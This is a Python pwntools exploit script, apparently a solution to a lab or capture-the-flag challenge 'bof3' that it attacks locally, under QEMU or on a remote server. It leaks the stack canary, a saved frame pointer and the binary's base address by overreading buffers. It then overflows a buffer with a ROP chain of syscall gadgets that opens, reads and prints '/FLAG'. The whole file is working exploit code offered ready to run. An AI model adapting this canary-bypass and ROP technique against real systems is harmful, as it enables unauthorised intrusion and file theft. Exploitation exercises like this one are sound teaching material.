#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = '../spec/bof3'
port = 12344

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
    # print("pid:", r.pid)
    # pause()
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# First send, get canary and task rbp
r.sendafter(b'name? ',b'A' * (8*23+1))
r.recvuntil(b'A' * (8*23+1))
canary_rbp = r.recvline()
if len(canary_rbp) != 14:
    print("\\x00 in canary or in rbp, try again"); r.close(); exit(0)
canary_bytes = (int.from_bytes(canary_rbp[:7], byteorder='little') << 8).to_bytes(8, byteorder='little')
buf1_addr = int.from_bytes(canary_rbp[7:-1], byteorder='little') - 0xd0
buf3_addr = int.from_bytes(canary_rbp[7:-1], byteorder='little') - 0x70

# Second send, get base_addr
r.sendafter(b'number? ', b'A' * (8*19))
r.recvuntil(b'A' * (8*19))
# from objdump -S bof3, find there call <test> funciton
base_addr = int.from_bytes(r.recvline()[:-1], byteorder='little') - 0x9c83

# Third send, Set /FLAG string
r.sendafter(b"name? ", b'/FLAG\x00')
r.recvuntil(b'/FLAG')

# Forth send, replace
# syscall use vvmap and search -x 0f05c3 in pwndbg
rop_chain = [
    base_addr + 0x66287, 2,         # mov rax, 2            # pop rax ; ret
    base_addr + 0xbc33 , buf3_addr, # mov rdi, buf1_addr    # pop rdi ; ret
    base_addr + 0xa7a8 , 0,         # mov rsi, 0            # pop rsi ; ret
    base_addr + 0x30ba6,            # syscall (open)        # syscall ; ret
    base_addr + 0xbc33 , 3,         # mov rdi, 3            # pop rdi ; ret
    base_addr + 0x66287, 0,         # mov rax, 0            # pop rax ; ret
    base_addr + 0xa7a8 , buf1_addr, # mov rsi, buf1_addr    # pop rsi ; ret
    base_addr + 0x15f6e, 53,        # mov rdx, 53           # pop rdx ; ret
    base_addr + 0x30ba6,            # syscall (read)        # syscall ; ret
    base_addr + 0x66287, 1,         # mov rax, 0x1          # pop rax ; ret
    base_addr + 0xbc33 , 1,         # mov rdi, 0x1          # pop rdi ; ret
    base_addr + 0xa7a8 , buf1_addr, # mov rsi, buf1_addr    # pop rsi ; ret
    base_addr + 0x15f6e, 53,        # mov rdx, 53           # pop rdx ; ret
    base_addr + 0x30ba6,            # syscall (write)       # syscall ; ret
    base_addr + 0x66287, 60,        # mov rax, 60           # pop rax ; ret
    base_addr + 0xbc33 , 0,         # mov rdi, 0            # pop rdi ; ret
    base_addr + 0x30ba6,            # syscall (exit)        # syscall ; ret
]

r.sendafter(b'message: ', b'A' * (8 * 5) + canary_bytes + b'A' * 8 + b''.join([v.to_bytes(8, 'little') for v in rop_chain]))
r.recvuntil(b'\n\n')
print(r.recv().decode())
r.close()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
